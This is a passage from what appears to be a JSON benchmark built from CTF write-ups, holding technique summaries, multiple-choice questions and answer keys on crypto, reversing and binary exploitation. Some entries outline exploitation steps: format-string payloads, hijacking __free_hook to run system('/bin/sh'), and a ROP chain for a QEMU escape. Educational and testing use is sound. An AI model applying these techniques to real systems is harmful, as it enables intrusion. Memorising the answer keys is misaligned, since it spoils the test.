            "When employing a brute-force approach to find the initial values of a keystream in cryptographic challenges, implementing the decryption and keystream generation functions in the script used for brute-forcing can greatly simplify the trial process. This technique involves generating each possible combination of initial values (using tools like `itertools.product()` for Python), recreating the keystream for each combination, and then checking if the decrypted text contains known plaintext or patterns (e.g., the flag format like \"actf{\"). If such a pattern is detected, the correct initial values have likely been found, and the corresponding plaintext is the solution."
        ],
        "question": [
            "In a cryptographic challenge involving the generation of a keystream for encryption, if the keystream generation function is known and starts with two random bytes followed by deterministic bytes produced through a certain function, which of the following best describes a viable strategy for decrypting the message? - A. Analyzing the encryption algorithm to find a mathematical weakness in the keystream generation function. - B. Brute-forcing the encryption key directly without considering the keystream generation logic. - C. Brute-forcing the initial two bytes and reconstructing the keystream to decrypt the message. - D. Attempting to reverse engineer the encryption algorithm to avoid brute-forcing.",
            "When attempting to crack the encryption of a message that uses a known keystream generation process initiated with a small set of random bytes using Python, which approach is most effective for iterating through all possible initial values to identify the correct keystream? - A. Utilizing `for` loops to manually iterate through every possible byte combination for the initial values. - B. Employing `itertools.product(range(256), repeat=2)` to systematically generate every combination of initial two-byte values. - C. Writing a recursive function to explore all possible initial values until the correct plaintext appears. - D. Using a complex machine learning algorithm to predict the initial bytes instead of brute-forcing them."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "fonction_sp\u00e9ciale",
        "write_up": "dataset/raw/fonction_sp\u00e9ciale.md",
        "type": "crypto",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving pattern recognition or decomposition of data, look for how elements of the input can be grouped and transformed into a different representation. This transformation often involves enumerating and encoding characteristics of the input data, such as the frequency of digits or the sequence of numbers. This strategy is particularly useful in cryptography and puzzle challenges where the solution involves a hidden or obfuscated pattern that doesn't have an evident regularity in size or composition of the input and output data.",
            "When faced with a complex transformation function, solve it by breaking down the input into repetitive segments or recurring patterns, then apply a set transformation rule to each segment. These rules can include counting the occurrences of each element and then representing the count followed by the element itself. Such techniques are useful in challenges where the algorithm performs operations based on the composition or frequency of elements within the input data. \n\nExample payload transformation based on the challenge:\n``` \nInput segment: [222] --> Output: 32 (3 times 2)\n```"
        ],
        "question": [
            "In a cryptography challenge, participants are given a series of input and output examples from a special mathematical function and are asked to determine the function's output for a new input. The challenge involves observing patterns in how sequences of identical digits in the input are transformed into output sequences. Given the input \"2229555555768432252223133777492611\", how should the participant group the initial sequence of identical digits to begin transforming it based on the pattern provided in the examples?  - A. Separate each digit and analyze them as individual units. - B. Group all identical digits together regardless of their position in the input sequence. - C. Group consecutive identical digits together to identify recurring patterns. - D. Randomly group digits and apply a random transformation rule to each group. ",
            "In the same challenge, after grouping consecutive identical digits together, participants must apply a transformation rule to each group to derive the output. What is the correct transformation rule to apply to each group of identical digits based on the pattern found in the examples?  - A. Add all the digits in each group together and then record the sum followed by the digit. - B. Record the length of each group followed by the digits in ascending order. - C. For each group of identical digits, record the count of those digits followed by the digit itself. - D. Subtract each digit in the group from the highest digit in the input sequence and record the result. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Forest Trails",
        "write_up": "dataset/raw/Forest Trails.md",
        "type": "misc",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When faced with a challenge presenting ciphertext in numeric format, consider decoding it as ASCII characters, especially when the numbers fall within the ASCII printable character range. This is a common technique used to hide plaintext or encoded flags within challenges.",
            "For challenges that involve rearranging or structuring decoded information, explore applying concepts from computer science, such as graph theory and specifically binary trees. A complete binary tree structure may be hinted at by the challenge's context or description. Utilizing depth-first search traversal (specifically in-order traversal) is effective for reading and reconstructing the flag or message from such structures. \n\n   Example approach for in-order traversal:\n   - Start from the root node.\n   - Recursively traverse the left subtree.\n   - Visit the root node.\n   - Recursively traverse the right subtree.\n   \n   This method can reveal the intended sequence of characters or elements for constructing the solution."
        ],
        "question": [
            "In a cybersecurity challenge, you come across a series of numbers: 072, 101, 108, 108, 111. These numbers must be converted to reveal a hidden message. Which method should you use to decode this message? - A. Use a Caesar cipher shift - B. Decode it as hexadecimal values - C. Decode it as ASCII characters - D. Translate it using Morse code",
            "You are tasked with reconstructing a message hidden within a structured format resembling a tree. The challenge hints at using a traversal method to correctly order the elements and reveal the message. Which traversal method should you use if the structure is a rooted complete binary tree and you need to follow a specific path to decode the flag? - A. Breadth-first search traversal - B. Pre-order depth-first search traversal - C. In-order depth-first search traversal - D. Post-order depth-first search traversal"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Forgot Your Password_",
        "write_up": "dataset/raw/Forgot Your Password_.md",
        "type": "The type of CTF challenge in this write-up is **crypto**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge requiring the recovery of initial states in a complex algorithm-based generation process where direct calculation is not feasible, utilizing constraint solvers like Z3 can be an effective strategy. This is especially true for algorithms involving bitwise operations and mathematical functions that produce specific outputs. In such scenarios, defining the problem in terms of constraints and then letting a solver find the values that meet these constraints can lead you to solve the challenge.",
            "In challenges where the output is a sequence of characters and the task is to find original input values, consider converting the character sequences back to numeric form if the algorithm operates on numbers. This is crucial in scenarios where the algorithm's internal state is manipulated through bitwise operations. Reverse engineering the process by working backwards from the known output can significantly narrow down the search space, making it easier for tools like Z3 solver to find the original input values.  \nExample input conversion for a flag 'hsctfissocoolwow':  \n```python\nflag1 = int('hsctfiss'[::-1].encode('hex'),16)\nflag2 = int('ocoolwow'[::-1].encode('hex'),16)\n```"
        ],
        "question": [
            "In a cryptographic challenge, you encounter a sequence generator designed with complex bitwise operations and mathematical functions. To solve a part of the puzzle, you need to determine original values that, after several iterations, lead to a given output. What strategy would be most effective for reversing or decoding this algorithm to find the initial inputs? - A. Manually solving each step of the algorithm in reverse order. - B. Utilizing a constraint solver like Z3 to model the algorithm as a set of constraints. - C. Guessing potential starting values and checking if they lead to the correct output. - D. Searching for common vulnerabilities in the algorithm's implementation.",
            "In a cybersecurity challenge that involves reversing a custom encryption algorithm, the final output is given as a sequence of characters, e.g., 'hsctfissocoolwow'. The algorithm manipulates internal state variables through bitwise operations based on initial numeric inputs. Given the necessity to find these original numeric values, which preprocessing step is crucial before using tools like Z3 solver to work your way backwards from the output? - A. Translating the character sequence output directly into ASCII values and using them as constraints. - B. Performing a frequency analysis on the character sequence to guess the numeric inputs. - C. Converting the output character sequence into its numeric form by reversing the string, encoding it into hexadecimal, and then translating to integers. - D. Encrypting the output character sequence with a common algorithm to compare against the initial state variables."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Forgotten secret",
        "write_up": "dataset/raw/Forgotten secret.md",
        "type": "This write-up is describing a challenge related to a binary exploitation technique known as pwn (short for \"pawn\"). The challenge involves manipulating Docker images to extract sensitive information such as SSH private keys and encrypted files, and then using these to decrypt encrypted data. The final goal is to retrieve the flag `dctf{k33p_y0r_k3ys_s4f3}`.",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with Docker images in CTF challenges, it's advisable to inspect the image without running it to avoid potential security risks. Tools like 7zip can be used to extract files from images, which can lead to discovering sensitive information such as private keys or secret keys stored within. This approach is critical when Docker best practices are not followed, and sensitive data is left exposed within the container's file system.",
            "In scenarios involving encrypted data (e.g., `cipher.bin` files) and available private keys, the encryption's passphrase might be extracted from unrelated configuration files or environment variables within the same Docker image. Once the correct passphrase is identified, it can be used to convert the private key into a readable format for cryptographic tools. This process enables the decryption of the encrypted data using tools like CyberChef with RSA decryption, revealing hidden messages or flags. When performing the RSA decryption, ensure the private key is in the correct format (e.g., RSA PRIVATE KEY from OPENSSH PRIVATE KEY) and that proper encryption details (encryption algorithm, padding, and hashing algorithm) are used.\n\n    Example commands:\n    ```\n    Convert OPENSSH private key to RSA PRIVATE KEY format:\n    $ ssh-keygen -p -m PEM -f id_rsa  \n    Enter old passphrase: SECRET_KEY\n    Enter new passphrase (empty for no passphrase): \n    Enter same passphrase again:\n    ```\n\n    Example CyberChef Recipe for RSA decryption (abstract format):\n    ```\n    RSA_Decrypt('-----BEGIN RSA PRIVATE KEY-----...-----END RSA PRIVATE KEY-----', '', 'RSAES-PKCS1-V1_5', 'SHA-1')\n    ```"
        ],
        "question": [
            "When inspecting a Docker image for a CTF challenge, which tool can be effectively used to explore its contents and potentially uncover secrets without executing the image? - A. Docker Run - B. 7zip - C. Ping Command - D. netstat Utility",
            "In a cryptographic challenge within a Docker container, after finding a private SSH key and a cipher file, what is the first step in the process to utilize the found SSH key for decrypting the cipher file? - A. Execute a brute-force attack on the cipher file using the SSH key. - B. Convert the cipher file to a hexadecimal format for ease of decryption. - C. Convert the SSH key from OPENSSH to RSA PRIVATE KEY format using the secret key as the passphrase. - D. Transfer the cipher file to a remote server for decryption."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "ForMatt Zelinsky",
        "write_up": "dataset/raw/ForMatt Zelinsky.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 461,
        "max_score": 500,
        "difficulty": 0.922,
        "knowledge": [
            "When exploiting format string vulnerabilities, particularly when the program prints user input directly without format specification, use `fmtstr_payload` from pwntools to craft payloads for executing arbitrary code or leaking memory. This method is efficient for overwriting specific addresses (e.g., return address) with desired values, thereby redirecting execution flow. This approach is applicable when you have determined the offset to the format string within the stack, and you can manipulate memory addresses directly.\n   - Example payload concept: `fmtstr_payload(offset, {target_address: value_to_write}, write_size='short')`",
            "In challenges involving leaking of memory addresses to bypass ASLR (Address Space Layout Randomization) and executing a ropchain or shellcode, after obtaining leaks, such as a stack or PIE (Position Independent Executable) leak, use these to calculate offsets. You can then adjust the base addresses of your payloads accordingly, allowing you to call functions like `puts` to leak libc addresses or execute gadgets. This is particularly useful when you're also given a format string vulnerability to exploit.\n   - Example concept for calculating base address using leaks: `exe.address = main_leak - exe.symbols['main']`"
        ],
        "question": [
            "In a scenario where an attacker identifies a format string vulnerability allowing the unfiltered printing of user input within a program, which pwntools function aids in crafting payloads to manipulate memory addresses or execute arbitrary code by overwriting specific addresses? - A. `fmtstr_exec(offset, {target_address: new_value})` - B. `payload_format_string(offset, addresses)` - C. `fmtstr_payload(offset, {target_address: value_to_write}, write_size='short')` - D. `format_exploit_builder(offset, target_address, value)`",
            "In the context of exploiting a binary with ASLR protection enabled, which operation is crucial for recalculating the base address of the executable or a library in memory, following the acquisition of relevant memory address leaks through an exploit? - A. `base_address = leak - symbols_offset` - B. `libc.base = libc_leak - libc.symbols['function_name']` - C. `stack.address = stack_leak + leak_offset` - D. `exe.address = main_leak - exe.symbols['main']`"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "FriendSpaceBookPlusAllAccessRedPremium",
        "write_up": "dataset/raw/FriendSpaceBookPlusAllAccessRedPremium.com.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving encoded data and a known sequence of unique keys (e.g., palindromic prime numbers), the XOR cryptographic method can be used for decoding. Identifying the pattern of the keys (such as prime numbers, palindromic numbers, or both) is crucial, as it provides a deterministic way to decode each piece of data. This method requires the identification of the key sequence used for encoding and applying XOR with each key to the corresponding encoded message chunk.  \nExample payload (where `encoded_values` is a list of encoded data, and `keys` is the list of palindromic prime numbers identified):  \n```python\ndecoded_message = ''.join([chr(val ^ key) for val, key in zip(encoded_values, keys)])\nprint(decoded_message)\n```",
            "When facing challenges that involve a large set of data or a sequence that is computationally expensive to generate (e.g., palindromic primes), leveraging external libraries or databases can significantly optimize the process. For generating palindromic primes quickly, the `sympy` library or precomputed sequences available in mathematical databases like OEIS can be utilized instead of implementing a prime-checking and palindrome-checking algorithm from scratch. This approach not only speeds up the process but also ensures accuracy by relying on well-tested methods and data.  \nExample code snippet (using `sympy` and OEIS sequence):\n```python\nfrom itertools import chain\nfrom sympy import isprime\n\n# Generate palindromic primes using a comprehension list combined with symmetry and prime checking\npalindromic_primes = sorted(n for n in chain(\n    (int(str(x) + str(x)[::-1]) for x in range(1, 10**5)),\n    (int(str(x) + str(x)[-2::-1]) for x in range(1, 10**5))\n) if isprime(n))\n```"
        ],
        "question": [
            "In a decryption challenge where encoded data is decrypted using XOR with a key sequence of palindromic prime numbers, which Python code snippet correctly implements the decryption logic?  - A. `decoded_data = \"\".join([chr(data ^ key) for key, data in enumerate(encoded_data)])` - B. `decoded_data = [chr(key ^ data) for key, data in zip(keys, encoded_data)]` - C. `decoded_message = ''.join([chr(data ^ key) for data, key in zip(encoded_values, keys)])` - D. `decoded_data = ''.join([chr(val ^ key) for val, key in zip(encoded_values, keys)])` ",
            "In solving efficiency problems for generating a sequence of palindromic primes used in cryptography challenges, which approach correctly leverages Python libraries for generating this sequence quickly?  - A. Use a for loop to iterate over a range of numbers, checking each for primality and palindromicity without optimization. - B. Employ the `sympy.isprime` function combined with list comprehension for generating palindromic primes from a pre-defined range. - C. Manually input a list of known palindromic primes up to a certain number without utilizing any library for prime checking. - D. Implement an iterative search over all integers, using a custom function to check for both primality and palindromicity without any optimization or external library usage. "
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "frog math",
        "write_up": "dataset/raw/frog math.md",
        "type": "The type of challenge described in this CTF write-up is a **reverse** challenge.",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When exploiting binary vulnerabilities involving floating-point and integer arithmetic registers, it's critical to understand the architectural linkage between different types of registers. Specifically, x64 architecture presents an opportunity to manipulate lower-level operations through the overlapping of mmx and x87 registers. This allows arbitrary read/write by controlling `mm7` through floating-point operations. This technique is applicable in scenarios where direct manipulation of certain registers is restricted but control over floating-point operations is provided.",
            "To craft specific values in restricted registers like `mm7` for pointer manipulation in scenarios where direct assignment is not possible due to architectural constraints, use the concept of subnormal numbers. These numbers allow the setting of addresses or pointers with leading null bytes by carefully crafting the floating-point representation to fit within the constraints of the mantissa and exponent in x87 extended precision format. This method requires precise floating-point arithmetic, achievable through libraries like `mpmath`, which support higher precision calculations than default floating-point operations in languages like Python.\n\n   Example of crafting a subnormal number to control `mm7`:\n   ```python\n   import mpmath\n   mpmath.mp.prec = 200  # Set precision\n   target_value = 0xdeadbeef  # Hypothetical address or value to set\n   subnormal_value = mpmath.mpf(target_value) / (2 ** (mpmath.mp.prec - 1))\n   ```\nThis example demonstrates how to calculate a subnormal number representing the desired `target_value` in the `mm7` register, considering the higher precision requirements for manipulating extended precision floating-point numbers."
        ],
        "question": [
            "In the context of exploiting vulnerabilities in a scenario where a binary with all protections enabled allows arithmetic operations in both integer mode using mmx registers and floating point mode using x87 registers, how can an attacker achieve arbitrary read/write when direct manipulation of certain mmx registers is restricted, but they have control over floating-point operations? - A. Use the stack pointer directly to manipulate memory addresses. - B. Manipulate the program counter to redirect execution flow. - C. Exploit the architectural linkage between mmx and x87 registers to control `mm7` through floating-point operations. - D. Invoke system calls directly to modify register values.",
            "When direct assignment to a register like `mm7` is not possible due to restrictions in a binary's architecture, and the goal is to manipulate pointers with leading null bytes, what method allows the crafting of specific values in such registers using floating-point arithmetic? - A. Use integer overflow to bypass register constraints. - B. Employ subnormal numbers with carefully crafted floating-point representations. - C. Directly input the desired address in hexadecimal format. - D. Encode the address as a standard floating-point number without any modifications."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Frogs",
        "write_up": "dataset/raw/Frogs.md",
        "type": "This write-up describes a programming challenge where the player had to solve a mathematical problem involving counting the number of ways a frog can jump on a ladder. The player had to come up with efficient ways to compute the sum for different values of N within a time constraint. The challenge involved concepts of recursion, dynamic programming, and optimizing code for performance.\n\nBased on the description provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "FireShell/2019",
            "https://ctftime.org/event/727/tasks/"
        ],
        "score": 124,
        "max_score": 500,
        "difficulty": 0.248,
        "knowledge": [
            "When facing a Proof of Work (PoW) requirement that involves finding a string whose SHA-256 hash satisfies a specific condition (e.g., the last 6 characters of the hash match a given pattern), a brute-force approach can be efficiently implemented using Python. Such scripts generate strings and compute their SHA-256 hashes, iterating through potential solutions until finding one that meets the condition. This technique is applicable across various CTF challenges involving different hashing algorithms or conditions. Example payload:\n\n```python\nimport hashlib\nprefix = \"CTF{\"\nsuffix = \"}\"\nstring = \"example\"\nwhile not hashlib.sha256((prefix + string + suffix).encode()).hexdigest().endswith(\"86df4f\"):\n    string = next_candidate(string)\n# Assume next_candidate is a function that produces the next string to test\n```",
            "In programming challenges where you need to calculate the number of ways to reach a certain step (N) by taking 1, 2, or 3 steps at a time, using recursion directly can be inefficient for large N values due to repeated calculations. A more efficient approach is to implement dynamic programming techniques such as memoization or use an iterative method to pre-compute values up to a certain limit (e.g., using a lookup table). This strategy reduces the computation time significantly, making it suitable for challenges with strict time constraints. For challenges requiring answers modulo a certain number, ensure computations are performed within this constraint to avoid numerical overflow. Example payload:\n\n```python\nlookup = [0] * 1000001\nlookup[0], lookup[1], lookup[2] = 1, 1, 2\nfor i in range(3, 1000001):\n    lookup[i] = (lookup[i-1] + lookup[i-2] + lookup[i-3]) % 13371337\n```"
        ],
        "question": [
            "When implementing a brute-force script to solve a Proof of Work (PoW) challenge that requires finding a string whose SHA-256 hash ends with a specific pattern, which Python library is essential for generating SHA-256 hashes? - A. `import sys` - B. `import hashlib` - C. `import json` - D. `import re`",
            "In solving a problem that involves calculating the number of ways a frog can reach the Nth step by taking 1, 2, or 3 steps at a time, which programming technique is crucial for improving efficiency and preventing the issue of repeated calculations for large N values? - A. Using a brute-force approach with recursion - B. Using an iterative method with a fixed-size array for memoization - C. Computing directly in the main function without auxiliary storage - D. Storing all input values in a list and processing them at once"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "FSMir 2",
        "write_up": "dataset/raw/FSMir 2.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 197,
        "max_score": 500,
        "difficulty": 0.394,
        "knowledge": [
            "When dealing with binaries requiring a specific input, and the validation logic is complex or obfuscated, employing symbolic execution frameworks like angr can automate the process of finding valid inputs. These frameworks can search through different execution paths and identify the conditions that lead to a desired outcome, such as confirming a correct password. In cases where the expected correct output or behaviour (for example, a success message) is known, it can be used as a criterion for the symbolic execution tool to find the valid input.\n   \n   **General Approach using angr:**\n   ```python\n   import angr\n   import claripy\n\n   project = angr.Project(\"binary_name\")\n   input_length = claripy.BVS('input_length_variable_name', bit_length)  # Bit length based on input requirements\n   state = project.factory.entry_state(stdin=angr.SimFile('/tmp/stdin', content=input_length))\n   sim_manager = project.factory.simulation_manager(state)\n   sim_manager.explore(find=lambda s: b\"success_message\" in s.posix.dumps(1))\n   if sim_manager.found:\n       found = sim_manager.found[0]\n       print(found.posix.dumps(0))  # Extract the found input\n   ```",
            "In challenges involving SystemVerilog files representing Finite State Machines (FSMs) that advance states based on input, systematically analyzing the conditions for state transitions can reveal the sequence of inputs (`di` values) that transition the FSM from an initial state to a target solved state. This can be achieved by parsing the SystemVerilog file to create a map of state transitions and input values, then traversing this map either in a direct or reverse order depending on the problem specifics, to reconstruct the sequence of inputs representing the flag.\n\n   **Reconstructing Flag from FSM in SystemVerilog:**\n   ```python\n   # Assuming entries is a dict mapping current states to tuples of (next state, input_value) for direct mapping\n   # or mapping new states to previous states and input_values for reverse mapping.\n\n   state = initial_state  # Start state for direct traversal or end state for reverse traversal\n   flag = []\n   while some_condition:  # Condition to stop the traversal, usually reaching an end or start state\n       if direct_traversal:\n           state, input_value = entries[state]\n       elif reverse_traversal:\n           state, input_value = find_previous_state_and_input(entries, state)\n       flag.append(input_value)\n   if reverse_traversal:\n       flag.reverse()\n   print(''.join(flag))  # Convert the list of inputs to a string representing the flag\n   ```\n   \n   For reverse traversal, `find_previous_state_and_input` would be a function to select the correct tuple (previous_state, input_value) from entries, based on the current state."
        ],
        "question": [
            "In a binary analysis challenge, a 64-bit Linux binary requires a specific password to acknowledge success. The binary's complex validation logic is suitably tackled with the angr framework for symbolic execution. The script aims to automatically discover the valid password by exploiting angr's ability to navigate through various execution paths until a state that outputs a \"Good password\" message is found. Which line of the following script correctly sets up the symbolic execution to find the path that leads to the desired \"Good password\" message? - A. `simgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(2))` - B. `p.explore(find=lambda s: b\"Good password\" in s.posix.dumps(1))` - C. `simgr.explore(find=lambda s: b\"Good password\" in s.stdout)` - D. `simgr.explore(find=lambda s: b\"Good\" in s.posix.dumps(1))` ",
            "When dealing with a challenge involving a SystemVerilog representation of a Finite State Machine (FSM), a technique involves parsing the file to create a map of state transitions that are required to solve the challenge. This approach is demonstrated where a solution involves traversing from an initial state to a target solved state by methodically collecting inputs (`di` values) that satisfy the transition conditions. Given a scenario where one is employing Python to automate the collection of these inputs based on state transitions defined in a SystemVerilog file, which snippet best illustrates the final step to print the reconstructed flag from collected inputs? - A. `print(''.join(chr(i) for i in flag))` - B. `print(\"FLAG: \" + ''.join(flag))` - C. `print(\"The flag is: \"+flag)` - D. `print(''.join(flag))` "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "FSMir",
        "write_up": "dataset/raw/FSMir.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 154,
        "max_score": 500,
        "difficulty": 0.308,
        "knowledge": [
            "In a challenge that requires analyzing binary behavior, using symbolic execution tools like angr can identify paths that lead to successful outcomes without manually tracing complex logic. When the binary expects a specific input of a fixed length to display a success message or a flag, a symbolic variable for the input length can be defined to let the tool automatically find the input string that satisfies all conditions leading to the success message.\n   - Example usage with angr:\n     ```python\n     import angr\n     import claripy\n\n     p = angr.Project(\"binary_name\")\n     symsize = claripy.BVS('inputLength', bit_length)  # Bit length to match expected input length\n     simfile = angr.SimFile('/tmp/stdin', size=symsize)\n     state = p.factory.entry_state(stdin=simfile)\n     simgr = p.factory.simulation_manager(state)\n     simgr.explore(find=lambda s: b\"Success Message\" in s.posix.dumps(1))\n     if simgr.found:\n         found_state = simgr.found[0]\n         print(found_state.posix.dumps(0))  # Output the flag or success input\n     ```",
            "In challenges involving reverse engineering of SystemVerilog code to find input sequences (flags), mapping the state transitions and the input (`di`) that cause these transitions can reconstruct the required input sequence. This process involves identifying the XOR relationship between the current state, the input, and the next state, and using this relationship to traverse from the initial state to the final (solution) state.\n   - Example approach to reconstruct input sequence:\n     ```python\n     # Initialize variables to represent states and the flag\n     state = initial_state\n     flag = []\n     # Transition map, where key is the current state, and value is a tuple of (next_state, input_character)\n     entries = {current_state: (next_state, 'input_character')}\n     \n     while state != final_state:\n         state, flag_part = entries[state]\n         flag.append(flag_part)\n     \n     # Combine flag parts to get the full flag\n     reconstructed_flag = ''.join(flag)\n     print(\"FLAG:\", reconstructed_flag)\n     ```"
        ],
        "question": [
            "In the context of using angr for automated input discovery, given a challenge scenario where a Linux binary accepts an input through stdin and checks it against a hidden logic to output a \"Good password\" message, how can one use angr to find the correct input assuming the input needs to be a specific length for the binary to consider it valid? - A. Write a Python script that defines the input length as a concrete number and looks for the string \"Error\" in the output. - B. Manually input different strings into the binary to see which one produces the \"Good password\" output. - C. Use gdb to set breakpoints within the binary to trace the execution flow manually and find the correct input. - D. Define a symbolic variable for input length using `claripy.BVS` and use `simgr.explore` to automatically find the input that leads to the \"Good password\" message. ",
            "When faced with a SystemVerilog challenge where the objective is to reverse-engineer the input (`di`) sequence leading to a specific end state, how can you reconstruct the required input sequence based on the XOR relationship between the current state, the input, and the next state? - A. Create a script that randomly guesses the input `di` until it incidentally matches the required sequence. - B. Utilize a brute-force approach on hardware to test every possible input sequence physically. - C. Map out transitions where the key is the current state and the value includes the next state and the character resulting from the XOR between the input `di` and a condition value, then iterate through this map to reconstruct the flag. - D. Assume all inputs (`di`) are characters from a known password list and sequentially test each to find a match. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "fufu",
        "write_up": "dataset/raw/fufu.md",
        "type": "pwn",
        "competition": [
            "KillerQueen/2021",
            "https://ctftime.org/event/1482/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a heap exploitation challenge, if confronted with a scenario where only one chunk at a time can be interacted with, and there's a need to perform operations such as freeing two different chunks of the same size without mallocing any in between (to avoid triggering security checks such as tcache count or double free detection in libc 2.31), one can employ a strategy that involves alternating malloc and free operations across different sizes. This can be orchestrated by reallocating freed chunks with a different size (using underflows or overflows if necessary) to manipulate the chunk's metadata and achieve the desired state in the heap for further exploitation.",
            "When the challenge allows manipulating the pointer to a function (like __free_hook) in libc, and the binary provides the ability to control content on the heap (via an overflow, underflow, or a similar vulnerability), it is possible to redirect execution flow to arbitrary functions within libc (e.g., system()). This can be achieved by first leaking libc addresses to bypass ASLR, then crafting payloads that align with the target system's architecture and libc version to overwrite pointers such as __free_hook with the address of system(). Finally, ensuring that the input to the next free operation aligns with a command (e.g., \"/bin/sh\") to get executed by the system() call.\n   \n   - Example Payload Steps:\n     1. Leak libc addresses using heap operations and manipulation.\n     2. Use an underflow or overflow vulnerability to write the libc address of `system()` into `__free_hook`.\n     3. Ensure a chunk containing \"/bin/sh\" string is allocated on the heap.\n     4. Trigger a scenario (e.g., another heap operation) that leads to the invocation of `free()` on the \"/bin/sh\" chunk, which now effectively calls `system(\"/bin/sh\")` due to the manipulation of `__free_hook`."
        ],
        "question": [
            "In a heap exploitation scenario where manipulating the tcache list is required but interactions are limited to manipulating one heap chunk at a time, which of the following strategies allows for effective heap manipulation to bypass restrictions like tcache count check or prevent triggering double free errors in libc versions like 2.31? - A. Free a single chunk multiple times without reallocating to populate the tcache list. - B. Allocate two chunks of the same size, free the first, then use an underflow to change the size of the second before freeing it, ensuring two chunks of the same size on the tcache list without reallocating. - C. Allocate and free chunks in alternating sizes without changing the metadata of any chunks. - D. Only use chunks of unique sizes to avoid triggering any security checks. ",
            "When exploiting a binary that allows redirecting execution flow to libc functions by manipulating heap pointers, such as __free_hook, to execute system(), what step is critical in crafting the payload for successful exploitation? - A. Overwriting __free_hook with the address of malloc() to repeatedly trigger allocations. - B. Inserting NOP sleds into heap chunks to bypass ASLR. - C. Writing the libc address of system() into __free_hook, then ensuring a chunk containing the command \"/bin/sh\" is freed to execute system(\"/bin/sh\"). - D. Changing the size metadata of all free chunks on the heap to prevent consolidation. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Full Chain - Wall Maria",
        "write_up": "dataset/raw/Full Chain - Wall Maria.md",
        "type": "reverse",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In QEMU escape challenges where a custom QEMU PCI driver vulnerability is found, the exploit often hinges on out-of-bounds (OOB) read or write vulnerabilities in memory-mapped IO (MMIO) handlers. Specifically, if the read or write size is incorrectly handled, it permits manipulating memory outside of intended buffers, enabling attackers to read or alter adjacent memory structures. This can lead to information leakage or arbitrary code execution by modifying function pointers or setting up ROP chains in the adjacent structures.",
            "In scenarios where the target environment employs sandboxing that restricts direct execution of arbitrary commands, alternative syscall-based strategies like using `open`, `read`, and `write` syscalls can be employed to interact with files or execute indirect actions. Leveraging gadgets found within the binary to manipulate the stack and registers allows for crafting a ROP chain to execute these syscalls sequentially. This tactic enables attackers to bypass the sandbox restrictions and achieve their objectives, e.g., reading a flag file.\n\n   Example payload segment for the ROP chain to read and write a file:\n   ```c\n   /* open(\"/home/user/flag\", O_RDONLY) */\n   *rop++ = pop_rdi;\n   *rop++ = flag_file_str_addr; // Address of \"/home/user/flag\" string\n   *rop++ = pop_rsi;\n   *rop++ = 0; // O_RDONLY\n   *rop++ = pop_rax;\n   *rop++ = 2; // syscall number for open\n   *rop++ = syscall;\n   /* read file */\n   *rop++ = xchg_edi_eax;\n   *rop++ = pop_rsi;\n   *rop++ = buffer_addr; // Buffer to store the read content\n   *rop++ = pop_rdx;\n   *rop++ = 0x100; // Number of bytes to read\n   *rop++ = pop_rax;\n   *rop++ = 0; // syscall number for read\n   *rop++ = syscall;\n   /* write content to stdout */\n   *rop++ = xchg_edx_eax;\n   *rop++ = pop_rdi;\n   *rop++ = 1; // STDOUT\n   *rop++ = pop_rax;\n   *rop++ = 1; // syscall number for write\n   *rop++ = syscall;\n   ```"
        ],
        "question": [
            "In the context of exploiting a custom QEMU PCI driver with an out-of-bounds write vulnerability in MMIO handlers, what is the key factor that enables the exploitation of this vulnerability? - A. Incorrect MMIO base address calculation leading to memory corruption - B. Use of uninitialized variables within the MMIO handlers causing undefined behavior - C. Incorrect handling of the read or write size allowing manipulation of memory outside of intended buffers - D. Lack of proper validation checks before performing memory operations within MMIO handlers ",
